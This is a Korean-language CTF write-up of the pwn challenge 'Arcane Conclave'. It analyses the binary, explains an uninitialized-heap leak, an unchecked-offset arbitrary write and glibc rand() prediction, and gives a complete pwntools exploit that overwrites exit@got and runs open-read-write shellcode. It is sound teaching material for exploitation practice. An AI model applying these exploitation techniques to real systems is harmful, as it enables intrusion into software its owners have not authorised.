---
ctf_name: "Dreamhack CTF Season 8 Round #6"
challenge_name: "Arcane Conclave"
category: "pwn"           # web / pwn / rev / crypto / misc
difficulty: "medium"      # easy / medium / hard / insane
author: "aswe0810m"
date: "2026-09-19"
points: 500
tags: [seccomp, ORW, tcache, safe-linking, PRNG, GOT-overwrite, arbitrary-write]
---

# Arcane Conclave

## 문제 설명

> # [A] Arcane Conclave
> 
> - 816 pts
> - pwnable
> 
> ## Description
> Step into the Arcane Conclave. Inscribe the Grand Grimoire, ascend to Archmage, and etch the forbidden rites into the Summoning Circle.
> 
> ## Environment
>     Arch:       amd64-64-little
>     RELRO:      Partial RELRO
>     Stack:      Canary found
>     NX:         NX enabled
>     PIE:        No PIE (0x400000)
>     SHSTK:      Enabled
>     IBT:        Enabled
>     Stripped:   No
>     Debuginfo:  Yes
> 
- `flag`, `libc.so.6`, `prob` 파일 제공

## 풀이

### 분석

- 집회에 들어가서 -> 그랜드 그리모어에 가입하고 -> 대마법사로 승격한 뒤 -> 소환진에 금지된 의식을 새겨라 라고 되어 있으므로 해당 순서대로 문제를 해결하면 될 것으로 파악하였다.
- 문제에서 제공된 `prob` 파일을 디스어셈블해보면 seccomp이 설정되어 있는 것을 확인할 수 있었다. 이를 통해서 ORW를 이용해야 할 것이라고 예상할 수 있었다.
- 문제 전반적으로 마법사와 같은 중세 판타지 영어 단어들이 많이 사용되어서 프로그램의 실행 결과에 대한 영 단어에 대한 분석이 조금 필요하다고 판단하였다.

#### 프로그램 실행 결과 - 동적 분석
> 
> ❯ prob
> 
> [Archon] Preparing to convene the Conclave...
> 
> Name Your Conclave: test (집회의 이름을 설정)
> 
>Inscribe the Grand Grimoire (max 0x420 bytes): test (조직이 어떤 내용을 다루는지에 대한 설정 - max 0x420이라고 되어 있으므로 해당 부분에 대해서 정적 분석시 자세히 볼 필요가 있다고 생각)
> 
> ===========================================
>
> Welcome to the Arcane Conclave of test
> 
> ===========================================
> 
> [Current Mana: 0]
> 1. Incant a Spell (Arithmetic, Grows Mana)
> 2. Present Yourself (Apprentice / Archmage)
> 3. Depart the Sanctum
> 4. Rewrite the Grimoire (Archmage Only)
> 5. Read Sealed Scrolls
> 6. Seal a Scroll
> 7. Leave the Order
> Cast Your Will >
> 

1. **Incant a Spell (Arithmetic, Grows Mana):** 주문을 읊는 선택창으로, 선택하면 수학 연산이 나오면서, 맞추면 마나가 늘어난다.
2. **Present Yourself (Apprentice / Archmage):** 집회에 자신의 위계를 소개하고 인정받는 선택창이다. 선택하면 2가지 선택지가 나온다.
    1. Sworn Apprentice (서약한 견습생): 아무 문자열이나 넣어도 되는 것으로 확인하였다.
    2. Ascend as Archmage (대마법사로 승격): Archmage's Prophetic Rune (OTP) 라는 컨셉의 무언가 알맞는 문자열을 넣어야 대마법사로 승격할 수 있는 것으로 확인하였다. 또한 문제 설명에서 언급되었으므로 정적 분석시 중요하게 보아야 한다고 판단하였다.
3. **Depart the Sanctum:** 집회장을 나간다는 느낌의 선택창인데, 실제로 프로그램이 종료되지는 않고 다시 선택창이 나왔다. 동적 분석으로는 어떤 기능인지 정확히 알 수 없었다.
4. **Rewrite the Grimoire (Archmage Only):** 그리모어를 다시 덮어쓰는 기능으로 유추되는데, Archmage only이므로 Archmage만 그리모어를 다시 덮어 쓸 수 있다고 유추할 수 있었다.
5. **Read Sealed Scrolls:** 6번 선택창에서 문자열을 쓰고, 해당 문자열을 모두 출력하는 것으로 보였다.
6. **Seal a Scroll**: 최대 32바이트 크기의 문자열을 입력하여 저장할 수 있게 해주는 선택창으로 보였다.
7. **Leave the Order:** 집회를 나오는 (프로그램을 종료하는) 기능으로 판단하였다. 이때 그냥 프로그램이 종료되는 것이 아닌 invalid system call이라고 프로그램이 종료되었는데, seccomp이 있을 것이라고 예상하였다.

#### ghidra 코드 분석 - 정적 분석

파일이 stripped되어 있지 않아서 ghidra를 통해서 프로그램을 이해하기 쉬웠다.

**주요 구조체:** `ConclaveState` 구조체 conclave - 주요 변수들을 제어하는 구조체 (context struct, ctx)
- conclave_name: char[32]
- summoning_circle: void *
- grimoire: char *
- current_apprentice: char *
- scroll_root: Scroll *
- mana: int
- rewrite_chance: int
- scroll_chance: int
- is_archmage: _Bool


**주요 구조체:** `Scroll` 구조체 scroll_root - scroll들을 linked list로 연결하는 구조체
- content: char *
- next: Scroll *

**init 함수 분석:**
- urandom으로 srandom 설정을 한다.
- conclave 구조체를 초기화하고 이름을 설정한다. 이때 read(0,&conclave,0x50); 으로 이름을 설정하므로, ctx를 원하는대로 조작할 수 있다.
- 이름을 설정한 후 grimoire를 힙 영역에 malloc으로 0x420 크기로 할당받아 설정한다.
- seccomp이 설정되어 있다. 동적 분석에서 예측한 결과와 맞는 것을 확인할 수 있었고, ORW를 이용해야 함을 예측할 수 있다.
- `conclave.summoning_circle`가 conclave.summoning_circle = mmap((void *)0x0,0x1000,7,0x22,-1,0);로 설정되어 있으므로 nx를 무시할 수 있는 영역이 주어진다는 것을 확인할 수 있다.

**1번 함수 분석:**
- 특별한 부분 없이 단순히 랜덤한 값 두개를 받아 합한 값을 맞추면 되는 함수. 맞추면 현재 마나 값에 +10을 한다. 
- ex. [Spell Incantation] 236689424 + 1114678838 = ?
- 보안 취약점은 따로 찾을 수 없었다. 주목할 부분은 mana가 어디서 쓰이는지 일 것 같음.

**2번 함수 분석:**
- 동적 분석에서 파악한 것과 별로 다르지 않았다.
- 1번 선택시 `conclave.current_apprentice`에 0x10 크기의 힙 영역을 할당한다.
- 2번 선택시 랜덤한 문자열 4바이트를 맞춰야 archmage가 될 수 있다.

**3번 함수 분석:**
- `conclave.conclave_apprentice`에 할당했던 힙 영역을 해제하고, 널 포인터로 초기화한다.
- `conclave.is_archmage`를 false로 초기화 한다.
- free를 하기는 하지만, dangling pointer를 만들지는 않기 때문에 중요한 함수로는 보이지 않는다.

**4번 함수 분석:**
- `conclave.grimoire`에 8바이트를 덮어 쓸 수 있다. 한 번에 2 회 임의 영역에 덮어쓸 수 있다.
- 이때 `conclave.mana`가 100보다 커야 하며,  `conclave.rewrite_chance` 횟수만큼 덮어쓸 기회를 얻을 수 있다. 당연히 `conclave.is_archmage`가 true여야 한다.

**5번 함수 분석:**
- 저장한 scroll들을 출력한다.

**6번 함수 분석:**
- scroll을 생성할 수 있다. 이때 `conclave.scroll_chance`를 통해서 한 번만 생성하도록 하지만, 실제로 생성을 하더라도 `concalve.scroll_chance`를 수정하지 않아서 여러 번 생성할 수 있다.
- scroll은 linked list 형태로 각각의 내용들을 저장하고 있다.

### 취약점

1. `init`의 `read(0, &conclave, 0x50)`: 이름 필드는 32바이트인데 구조체 전체 크기를 읽어서 모든 필드를 설정할 수 있다. 다만 33바이트 이상 보내면 `summoning_circle`을 잃게된다. 이는 취약점이기는 하지만, 결론적으로 함정인 취약점이었다.
2. `seal_a_scroll`의 미초기화 메모리 노출: `malloc(size)` 후 `read(0, c, size)`인데 read는 실제 전송 바이트만 채우므로 libseccomp이 남긴 tcache 잔존 `fd`가 `%s`로 출력되고, safe-linking 역산으로 힙 주소가 복원된다.
3. `rewrite_grimoire`의 offset 미검증: `grimoire`에 값을 쓸 때 offset을 검증하지 않으므로 음수 offset이 가능하여 임의 주소에 임의 쓰기가 가능해진다.
4. PRNG 예측: `incant_spell`이 `rand()`를 가공 없이 출력하므로, 32개 관측으로 상태를 복원할 수 있다.

### 익스플로잇

1. 이름에 p64(0x404121) + p64(0) — 16바이트만 보내서 summoning_circle을 보존하고, conclave_name 앞 16바이트를 가짜 Scroll 구조체로 만들어 둠. content = summoning_circle+1, next = NULL.
2. 메뉴 6으로 size=16 요청하고 1바이트만 전송. 남은 15바이트에 tcache 잔존 fd가 남음. 메뉴 5로 읽어서 safe-linking 역산 → heap_base. grimoire = heap_base + 0x2a0.
3. 메뉴 1을 16회 돌려 rand() 출력 32개 수집. 동시에 마나가 160이 되어 메뉴 4의 100 조건도 충족됨.
4. (o[1] + o[29]) % 2**31로 다음 rand() 예측, 메뉴 2의 2번으로 Archmage 승격. 50%라 실패하면 재시도.
5. 메뉴 4 첫 호출 — 주어진 2쓰기를 이렇게 배분.
- rewrite_chance = 9999, scroll_chance = 1 (p32(9999) + p32(1)로 8바이트 한 번에)
- scroll_root = 0x404100 → 1번에서 심어둔 가짜 노드를 가리킴
6. 메뉴 5 → %s가 0x404121부터 읽어서 summoning_circle이 출력됨. byte 0이 잘려 나오니까 << 8로 복원.
7. 메뉴 4 두 번째 호출 — 기준점을 옮기기 전에 .bss 작업을 먼저 끝냄.
- exit@got = summoning_circle
- conclave.grimoire = summoning_circle
    #1이 기준점을 안 건드리니까 둘 다 힙 기준으로 계산. 이 호출 이후 기준점이 RWX 페이지로 넘어가고, int 범위 때문에 .bss로는 다시 못 돌아옴.
8. 기준점이 summoning_circle이 됐으니 offset 0, 8, 16… 으로 ORW 셸코드를 8바이트씩 씀. open('./flag') → read(rax, rsp) → write(1, rsp)로 64바이트, 호출당 16바이트씩 4회.
9. 메뉴 7 선택 → main+0x1e5의 exit@plt가 RWX 페이지로 점프 → 플래그 출력.

```python
from pwn import *

p = process('./prob')
context.arch = 'amd64'

CONCLAVE = 0x404100
EXIT = 0x404090

def seal_a_scroll(size, content):
    p.sendlineafter(b'Cast Your Will > ', b'6')
    p.sendlineafter(b'Scroll size (max 32 bytes): ', str(size).encode())
    p.sendafter(b'Scroll content: ', content)
    
def read_sealed_scrolls():
    p.sendlineafter(b'Cast Your Will > ', b'5')
    p.recvuntil(b'[Sealed Scrolls of the Conclave]\n')
    content = p.recvline().split(b'. ', 1)
    result = u64(content[1][:-1].ljust(8, b'\x00'))
    return result

def Incant_a_spell(nums):
    p.sendlineafter(b'Cast Your Will > ', b'1')
    p.recvuntil(b'[Spell Incantation] ')
    num1 = int(p.recvuntil(b' ')[:-1])
    p.recvuntil(b'+ ')
    num2 = int(p.recvuntil(b' ')[:-1])
    ans = str((num1 + num2) % 2**32).encode()
    p.sendlineafter(b'> ', ans)
    nums.append(num1)
    nums.append(num2)
    
def present_yourself(num):
    p.sendlineafter(b'Cast Your Will > ', b'2')
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b"Archmage's Prophetic Rune (OTP): ", str(num).encode())
    check = p.recvline()
    if check == b'[+] The Conclave bows. Welcome, Archmage.\n':
        success('success')
    else:
        success('fail')
        exit()

def rewrite_the_grimoire(off1, msg1, off2, msg2):
    p.sendlineafter(b'Cast Your Will > ', b'4')
    p.sendlineafter(b'Grimoire Rune Offset 1: ', str(off1).encode())
    p.sendafter(b'New Incantation 1: ', msg1)
    p.sendlineafter(b'Grimoire Rune Offset 2: ', str(off2).encode())
    p.sendafter(b'New Incantation 2: ', msg2)
        
# init
p.sendafter(b'Name Your Conclave: ', p64(0x404121) + p64(0))
p.sendafter(b'Inscribe the Grand Grimoire (max 0x420 bytes): ', b'A')

# leak heap address
seal_a_scroll(16, b'A')
heap = read_sealed_scrolls()

part1 = heap & 0xfff00000
part2 = ((heap >> 12) ^ heap) & 0xff000
HEAP_BASE = part1 + part2 - 0x2000
GRIMOIRE = HEAP_BASE + 0x2a0
REWRITE_CHANCE_OFFSET =  CONCLAVE + 0x44 - GRIMOIRE
SCROLL_ROOT_OFFSET = CONCLAVE + 0x38 - GRIMOIRE
EXIT_OFFSET = EXIT - GRIMOIRE
GRIMOIRE_OFFSET = CONCLAVE + 0x28 - GRIMOIRE

success(f'heap_base = {HEAP_BASE:#x}')
success(f'grimoire =  {GRIMOIRE:#x}')
success(f'rewrite_chance = {REWRITE_CHANCE_OFFSET:#x}')

# ascend to Archmage
nums = list()
for _ in range(16):
    Incant_a_spell(nums)
exp = (nums[1] + nums[29]) % 2**31
present_yourself(exp)

# leak summoning_circle
rewrite_the_grimoire(REWRITE_CHANCE_OFFSET, p32(9999) + p32(1), SCROLL_ROOT_OFFSET, p64(CONCLAVE))
summoning_circle = (read_sealed_scrolls() << 8)
success(f'summoning_circle = {summoning_circle:#x}')

# overwrite exit@got and grimoire
rewrite_the_grimoire(EXIT_OFFSET, p64(summoning_circle), GRIMOIRE_OFFSET, p64(summoning_circle))

# ORW
orw = shellcraft.open('./flag', 0, 0)
orw += shellcraft.read('rax', 'rsp', 0x30)
orw += shellcraft.write(1, 'rsp', 0x30)
orw = asm(orw)

# exploit
for i in range(0, len(orw), 16):
    rewrite_the_grimoire(i, orw[i:i+8], i+8, orw[i+8:i+16])
    
p.sendlineafter(b'Cast Your Will > ', b'7')

p.interactive()
```

## 플래그

```
DH{REDACTED}
```

## 배운 점

gdb 출력의 기준점과 익스의 기준점은 다르다

pwndbg heap이 찍는 Addr는 malloc_chunk 구조체의 시작, 즉 prev_size 필드 주소다. malloc()이 반환하는 포인터는 거기서 +0x10이다. Size도 헤더를 포함한 값이라 malloc(0x420)이 0x430으로 보인다. 이걸 그대로 읽어서 grimoire를 heap_base + 0x290으로 잡았고, 쓰기가 전부 0x10씩 밀려서 엉뚱한 필드를 덮었다. 힙 문제에서 계속 만날 함정이다.

read()는 요청 길이가 아니라 전송 길이만큼만 채운다

malloc(16) 후 read(0, c, 16)에 1바이트만 보내면 나머지 15바이트는 이전 청크의 잔존값이다. 이 문제의 leak은 여기서 나왔다. 보통 문제는 leak 수단을 대놓고 주는데, 여기선 "요청 길이 ≠ 전송 길이"라는 미묘한 지점에서 직접 만들어내야 했다.

임의 쓰기의 기준점은 자기 자신을 옮길 수 있다

rewrite_grimoire가 기준점 conclave.grimoire를 루프 안에서 매 반복 다시 읽는다. 그래서 같은 호출의 쓰기 #1로 기준점을 옮기면 쓰기 #2가 새 기준을 쓴다. offset이 int라 힙에서 mmap 페이지까지 못 닿는 제약을 이걸로 우회했다.

단 기준점을 0x7f...로 옮기면 .bss가 다시 int 범위 밖이 되어 편도다. 작업 순서가 강제된다 — exit@got를 먼저 덮고 기준점을 옮겨야 한다.

제약 수치가 풀이 순서를 지시한다

rewrite_chance는 호출당 1 감소하는데 쓰기는 2회 주어지고, 초기값이 1이다. 즉 단 한 번의 호출에 주어진 2쓰기로 모든 준비를 끝내야 한다. 이 비대칭이 나머지 순서를 전부 결정했다.

mana >= 100, scroll_chance 미차감, incant_spell이 rand()를 가공 없이 출력하는 것도 마찬가지다. 장식이 하나도 없었고 각 숫자가 "이 순서로 풀어라"를 지시하고 있었다.

막혔을 때는 기법을 더 찾기보다 출제 의도를 다시 읽는 게 빨랐다

이름 입력의 read(0, &conclave, 0x50)은 구조체 전체를 덮을 수 있어 유혹적이지만, 33바이트 이상 보내면 summoning_circle을 잃고 NX 우회 수단이 사라진다. 그 길로 한참 갔다가 되돌아왔다. "이건 함정이다"를 판단한 근거는 새로운 기법이 아니라 문제 설명과 제약 수치였다.

추측한 상수는 전부 나중에 터졌다

0x290, % 2**32, str(msg).encode() — 막힌 지점이 전부 "모르는 기법"이 아니라 "안다고 생각한 것"이었다. 태그에 있는 기법은 개별로는 이미 다뤄본 것들이다. 디스어셈으로 확인하고 /proc/pid/mem으로 실제 값과 대조하기 전까지는 맞는지 알 수 없었다.

특히 rand()가 내부 상태를 >>1해서 반환한다는 걸 안 본 탓에 예측값이 참값과 1 차이가 나는 경우를 놓쳤다. PRNG 예측을 쓸 때는 출력이 상태의 가공된 형태인지부터 확인해야 한다.
